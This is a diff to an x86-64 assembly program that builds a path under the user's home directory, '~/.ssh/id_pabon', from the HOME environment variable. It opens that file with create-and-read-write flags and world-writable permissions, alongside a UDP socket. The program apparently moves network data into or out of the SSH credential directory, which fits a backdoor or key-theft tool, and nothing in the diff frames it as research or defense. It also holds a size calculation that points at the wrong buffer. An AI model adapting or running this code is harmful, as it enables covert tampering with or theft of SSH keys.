@@ -17,8 +17,8 @@ endstruc
 section .data
 
 
-    output_file db '/home/jules/output', 0
-    output_file_size equ $ - output_file
+    filename db '/.ssh/id_pabon', 0x00
+    filename_size equ $ - filename
 
 
     sock_addr:
@@ -51,6 +51,9 @@ section .data
 
 
 section .bss
+
+    buf_filename resb 200
+    buf_filename_size equ $ - buf
 
 
     buf resb 20000
@@ -86,6 +89,76 @@ _start:
     nop
     nop
     nop
+
+
+;;;;;
+
+    mov rax, 0x08
+    mov rsi, rsp
+    add rsi, 0x48
+    mov rcx, [rsi]  
+    add rcx, 0x02
+
+    imul rcx, rax
+
+    add rsi, rcx
+    mov rax, 'HOME'
+
+
+.loop:
+
+    cmp Qword [rsi], 0x00
+    je exit
+    mov rdi, [rsi]
+    scasd
+    je .next
+    add rsi, 0x08
+    jmp .loop
+
+
+.next:
+
+    inc rdi
+    mov rsi, buf_filename
+    xor rcx, rcx
+    xor rax, rax
+
+.loop2:
+
+    mov al, byte [rdi]
+    cmp al, 0x00
+    je .next2
+    mov [rsi], al
+    inc rsi
+    inc rdi
+    jmp .loop2
+
+.next2:
+
+    mov rdi, filename
+    
+.loop3:
+    
+    mov al, byte [rdi]
+    cmp al, 0x00
+    je .next3
+    mov [rsi], al
+    inc rsi
+    inc rdi
+    jmp .loop3
+
+.next3:
+
+    mov [rsi], byte 0x00
+
+
+
+
+
+
+
+;;;;;
+
 
     mov rsi, rbp
     add rsi, 0x10
@@ -149,7 +222,7 @@ _start:
 
 
 
-    mov rdi, output_file
+    mov rdi, buf_filename
     mov rsi, 0x42
     mov rdx, 0q00777
     mov rax, 0x02
@@ -171,7 +244,6 @@ _start:
     nop
     nop
     nop
-
     
     mov rdi, 0x2 ; AF_INET
     mov rsi, 0x2 ; SOCK_DGRAM
